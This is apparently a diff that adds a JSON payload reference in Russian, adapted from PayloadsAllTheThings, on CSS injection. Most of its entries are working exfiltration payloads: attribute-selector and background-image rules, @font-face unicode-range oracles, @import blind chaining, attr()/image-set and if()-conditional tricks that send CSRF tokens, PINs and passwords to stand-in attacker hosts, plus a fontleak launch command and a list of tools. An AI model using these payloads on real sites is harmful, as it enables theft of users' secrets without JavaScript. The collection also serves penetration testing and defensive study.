@@ -1,0 +1,200 @@
+{
+  "category": "CSS Injection",
+  "source": "PayloadsAllTheThings/CSS Injection/",
+  "entries": [
+    {
+      "subcategory": "Методология",
+      "title": "Что такое CSS Injection",
+      "language": "text",
+      "tags": ["methodology", "css-injection", "exfiltration"],
+      "body": "CSS Injection — уязвимость, когда приложение позволяет внедрить недоверенный CSS в страницу. Через манипуляцию стилями и инициирование сетевых запросов по атрибутам элементов можно эксфильтровать чувствительные данные: CSRF-токены, PIN-коды, OAuth-токены и прочие секреты.\n\nГлавное преимущество: CSS почти всегда разрешён CSP-правилами, тогда как JavaScript часто заблокирован. Поэтому атака работает там, где XSS невозможен — эксплуатация идёт чистым CSS, без JS."
+    },
+    {
+      "subcategory": "Методология",
+      "title": "Каналы детекта и эксфильтрации",
+      "language": "text",
+      "tags": ["methodology", "detection"],
+      "body": "CSS Selectors  селекторы атрибутов ([value^=a]) матчат значение и грузят background-image с твоего домена → утечка символа.\n@import        импорт внешних стилей с твоего сервера для блайнд-эксфильтрации (Blind CSS Exfiltration).\n@font-face     unicode-range грузит шрифт только если конкретный символ есть на странице → оракул присутствия символа.\nattr()         CSS-функция вытаскивает значение атрибута и подставляет его в URL (image-set).\nLigatures      кастомный шрифт с лигатурами меняет ширину элемента → детект по скроллбару / медиа-запросу.\nConditionals   if() + CSS-переменные дают логику прямо в inline-style без внешнего стиля."
+    },
+    {
+      "subcategory": "Методология",
+      "title": "Селекторы атрибутов — основа техники",
+      "language": "css",
+      "tags": ["methodology", "selectors", "detection"],
+      "body": "input[value^=a]   (prefix) — value начинается с \"a\".\ninput[value$=a]   (suffix) — value заканчивается на \"a\".\ninput[value*=a]   (substring) — value содержит \"a\"."
+    },
+    {
+      "subcategory": "Методология",
+      "title": "Где искать и как эксплуатировать",
+      "language": "text",
+      "tags": ["methodology", "recon"],
+      "body": "• Любой ввод, который потом отрисовывается в <style> или в атрибуте style.\n• Темы оформления, кастомные стили профиля, HTML-письма, превью.\n• Места, где разрешён CSS, но запрещён JS (строгая CSP).\n• Атака идёт перебором токена посимвольно: определили первый символ → обновляем payload под второй и т.д. Обычно нужен iframe, чтобы перезагрузить страницу с новым payload."
+    },
+
+    {
+      "subcategory": "Кража данных через селекторы",
+      "title": "Эксфильтрация через background-image",
+      "language": "css",
+      "tags": ["selectors", "exfiltration", "background-image"],
+      "body": "input[value^=\"TOKEN_012\"] {\n  background-image: url(http://attacker.example.com/?prefix=TOKEN_012);\n}"
+    },
+    {
+      "subcategory": "Кража данных через селекторы",
+      "title": "Точное совпадение значения (PIN / known value)",
+      "language": "css",
+      "tags": ["selectors", "exfiltration", "pin"],
+      "body": "input[name=\"pin\"][value=\"1234\"] {\n  background: url(https://[ATTACKER.DOMAIN.TLD]/log?pin=1234);\n}"
+    },
+    {
+      "subcategory": "Кража данных через селекторы",
+      "title": ":has() — стилизация родителя по потомку",
+      "language": "css",
+      "tags": ["selectors", "has", "exfiltration"],
+      "body": "div:has(input[value=\"1337\"]) {\n  background:url(/collectData?value=1337);\n}",
+      "meta": {
+        "tip": "Псевдокласс :has() позволяет применить стиль к родительскому элементу на основе его детей — удобно, когда нужный input сам по себе не может нести background."
+      }
+    },
+
+    {
+      "subcategory": "Посимвольная эксфильтрация",
+      "title": "Принцип посимвольного брутфорса",
+      "language": "text",
+      "tags": ["exfiltration", "bruteforce", "selectors"],
+      "body": "Токен перебирается символ за символом. Как только опознан первый символ, payload обновляется под угадывание второго, и так далее. Чаще всего для этого нужен iframe, который перезагружает страницу с новым payload."
+    },
+    {
+      "subcategory": "Посимвольная эксфильтрация",
+      "title": "Скрытые input — стилизуем соседний элемент",
+      "language": "css",
+      "tags": ["selectors", "hidden-input", "sibling"],
+      "body": "input[name=\"csrf-token\"][value^=\"a\"] + input {\n  background: url(https://[ATTACKER.DOMAIN.TLD]/?q=a)\n}",
+      "meta": {
+        "tip": "К hidden input нельзя применить background-image напрямую. Используй соседний селектор (+ или ~), чтобы застилизовать видимый элемент, идущий после скрытого input."
+      }
+    },
+    {
+      "subcategory": "Посимвольная эксфильтрация",
+      "title": "Ускорение перебора — параллельные prefix + suffix",
+      "language": "text",
+      "tags": ["selectors", "concurrency", "optimization"],
+      "body": "Используй prefix- и suffix-селекторы одновременно, чтобы ускорить угадывание. Назначь проверку префикса на одно свойство (например, background), а проверку суффикса — на другое (например, list-style-image или border-image)."
+    },
+
+    {
+      "subcategory": "@font-face unicode-range кейлоггер",
+      "title": "Оракул присутствия символа через unicode-range",
+      "language": "html",
+      "tags": ["font-face", "unicode-range", "oracle"],
+      "body": "<style>\n@font-face{ font-family:poc; src: url(http://attacker.example.com/?A); /* fetched */ unicode-range:U+0041; }\n@font-face{ font-family:poc; src: url(http://attacker.example.com/?B); /* fetched too */ unicode-range:U+0042; }\n@font-face{ font-family:poc; src: url(http://attacker.example.com/?C); /* not fetched */ unicode-range:U+0043; }\n#sensitive-information{ font-family:poc; }\n</style>\n<p id=\"sensitive-information\">AB</p>",
+      "meta": {
+        "tip": "Свойство unicode-range разрешает использовать шрифт только для конкретных символов. Если символ \"A\" есть на странице — браузер грузит шрифт с /?A; если \"C\" нет — запрос не уходит."
+      }
+    },
+    {
+      "subcategory": "@font-face unicode-range кейлоггер",
+      "title": "Ограничения техники unicode-range",
+      "language": "text",
+      "tags": ["font-face", "limitations"],
+      "body": "• Не различает повторяющиеся символы (\"AA\" триггерит запрос один раз).\n• Не определяет порядок символов.\n• Несмотря на это — очень надёжный оракул проверки наличия символа.\n• Chrome пометил это как WontFix: issues.chromium.org/issues/40083029"
+    },
+
+    {
+      "subcategory": "Кража CSRF-токенов",
+      "title": "Утечка CSRF-токена посимвольно",
+      "language": "css",
+      "tags": ["csrf", "exfiltration", "selectors"],
+      "body": "input[name=\"csrf-token\"][value^=\"a\"] + input {\n  background: url(https://[ATTACKER.DOMAIN.TLD]/?q=a)\n}",
+      "meta": {
+        "tip": "CSRF-токен обычно лежит в hidden input, поэтому background вешается на соседний видимый input через +. Перебирая префикс [value^=\"a\"], [value^=\"b\"]… восстанавливаем токен по символу."
+      }
+    },
+    {
+      "subcategory": "Кража CSRF-токенов",
+      "title": "Blind CSS Exfiltration через @import",
+      "language": "html",
+      "tags": ["import", "blind", "exfiltration"],
+      "body": "<style>@import url(http://[ATTACKER.DOMAIN.TLD]/staging?len=32);</style>\n<style>@import'//[ATTACKER.DOMAIN.TLD]'</style>",
+      "meta": {
+        "tip": "Техника Blind CSS Exfiltration: импорт внешних стилей триггерит коллбэки на твой сервер. Фреймы не всегда нужно перезагружать для переоценки CSS — @import допускает задержку, браузер обработает импорт и применит новые стили."
+      }
+    },
+    {
+      "subcategory": "Кража CSRF-токенов",
+      "title": "Sequential Import Chaining (SIC)",
+      "language": "text",
+      "tags": ["import", "sic", "exfiltration"],
+      "body": "SIC позволяет атакующему сцепить несколько шагов извлечения без перезагрузки страницы:\n\n1. Внедряем стартовое правило @import на staging-payload.\n2. Staging-payload держит соединение открытым (long-polling), пока генерирует следующий конкретный payload.\n3. Когда CSS-правило матчит (например, символ найден через background-image) — браузер делает запрос.\n4. Сервер ловит этот запрос и генерирует следующее правило @import, продолжая цепочку."
+    },
+
+    {
+      "subcategory": "Эксплуатация без JS",
+      "title": "Извлечение атрибута через attr() + image-set",
+      "language": "css",
+      "tags": ["attr", "image-set", "exfiltration"],
+      "body": "input[name=\"password\"] {\n  background: image-set(attr(value))\n}",
+      "meta": {
+        "tip": "CSS-функция attr() (см. Advanced attr()) умеет вытащить value инпута. Внутри image-set() браузер может попытаться интерпретировать значение атрибута как URL. Если стиль кросс-доменный — относительный URL резолвится против origin стиля, а не страницы."
+      }
+    },
+    {
+      "subcategory": "Эксплуатация без JS",
+      "title": "Целевой HTML для attr()-эксфильтрации",
+      "language": "html",
+      "tags": ["attr", "exfiltration", "target"],
+      "body": "<html>\n    <head>\n        <link rel=\"stylesheet\" href=\"http://attacker.local/index.css\">\n    </head>\n    <body>\n        <input type=\"text\" name=\"password\" value=\"supersecret\">\n    </body>\n</html>"
+    },
+    {
+      "subcategory": "Эксплуатация без JS",
+      "title": "Запрос на сервере атакующего (результат attr())",
+      "language": "text",
+      "tags": ["attr", "exfiltration", "log"],
+      "body": "10.10.10.10 - - [15/Feb/2026 16:33:21] \"GET /supersecret HTTP/1.1\" 404 -"
+    },
+    {
+      "subcategory": "Эксплуатация без JS",
+      "title": "Inline Style Exfiltration через CSS-условия",
+      "language": "html",
+      "tags": ["conditionals", "inline-style", "exfiltration"],
+      "body": "<div style='--val: attr(data-uid); --steal: if(style(--val:\"1\"): url(/1); else: if(style(--val:\"2\"): url(/2); else: if(style(--val:\"3\"): url(/3); else: if(style(--val:\"4\"): url(/4); else: if(style(--val:\"5\"): url(/5); else: if(style(--val:\"6\"): url(/6); else: if(style(--val:\"7\"): url(/7); else: if(style(--val:\"8\"): url(/8); else: if(style(--val:\"9\"): url(/9); else: url(/10)))))))))); background: image-set(var(--steal));' data-uid='1'></div>",
+      "meta": {
+        "tip": "Продвинутая техника: if() и CSS-переменные позволяют выполнять логику прямо в атрибуте style — без внешнего стиля. Пример крадёт атрибут data-uid, если он в диапазоне 1..10."
+      }
+    },
+    {
+      "subcategory": "Эксплуатация без JS",
+      "title": "Ligatures — утечка текстовых узлов по ширине",
+      "language": "text",
+      "tags": ["ligatures", "fontleak", "exfiltration"],
+      "body": "Техника эксплуатирует кастомные шрифты и лигатуры. Лигатура объединяет несколько символов в один глиф. Создав шрифт, где конкретные последовательности символов дают лигатуру огромной ширины, можно детектить изменение раскладки.\n\n1. Создаём кастомный шрифт с лигатурами под целевые строки.\n2. Медиа-запросами или скроллбарами детектим, изменилась ли отрисованная ширина элемента.\n\nВажно: CSS-селектор должен матчить ровно один элемент на целевой странице."
+    },
+    {
+      "subcategory": "Эксплуатация без JS",
+      "title": "fontleak — запуск и payload",
+      "language": "text",
+      "tags": ["ligatures", "fontleak", "tool"],
+      "body": "docker run -it --rm -p 4242:4242 -e BASE_URL=http://localhost:4242 ghcr.io/adrgs/fontleak:latest\n\n<style>@import url(\"http://localhost:4242/?selector=.secret&parent=head&alphabet=abcdef0123456789\");</style>"
+    },
+
+    {
+      "subcategory": "Инструменты",
+      "title": "Инструменты для CSS-эксфильтрации",
+      "language": "table",
+      "tags": ["tools", "exfiltration"],
+      "body": "",
+      "meta": {
+        "kind": "table",
+        "table": {
+          "headers": ["Инструмент", "Назначение"],
+          "rows": [
+            ["hackvertor/blind-css-exfiltration", "Эксфильтрация неизвестных страниц через Blind CSS"],
+            ["PortSwigger/css-exfiltration", "Коллекция техник CSS-эксфильтрации"],
+            ["cgvwzq/css-scrollbar-attack", "PoC утечки текстовых узлов через скроллбары"],
+            ["d0nutptr/sic", "Sequential Import Chaining для продвинутой эксфильтрации"],
+            ["adrgs/fontleak", "Быстрая эксфильтрация текста только через CSS и лигатуры"]
+          ]
+        }
+      }
+    }
+  ]
+}
